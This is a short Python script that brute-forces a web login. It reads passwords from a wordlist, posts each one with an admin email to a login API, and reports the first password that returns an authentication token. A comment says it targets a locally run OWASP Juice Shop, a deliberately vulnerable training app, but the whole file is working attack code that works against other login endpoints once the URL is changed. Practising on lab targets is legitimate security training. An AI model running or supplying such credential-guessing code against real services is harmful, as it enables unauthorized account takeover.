import requests
import sys

# This is for demo purposes against OWASP Juice Shop
target = "http://127.0.0.1:3000/rest/user/login"
usernames = ["admin@juice-sh.op"]  # Use email format per Juice Shop
passwords = "wordlist.txt"

for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n")
            sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password))
            sys.stdout.flush()
            
            # Send JSON payload to the API
            payload = {"email": username, "password": password}
            r = requests.post(target, json=payload)
            
            # Check for successful login (200 status and "authentication" in response) - Juice Shop is a dynamic app/single-page app. Can't check for change in page output.
            if r.status_code == 200 and "authentication" in r.json():
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>] Valid password '{}' found for '{}'!".format(password, username))
                sys.exit(0)
        sys.stdout.flush()
        sys.stdout.write("\tPassword not found for {}!\n".format(username))
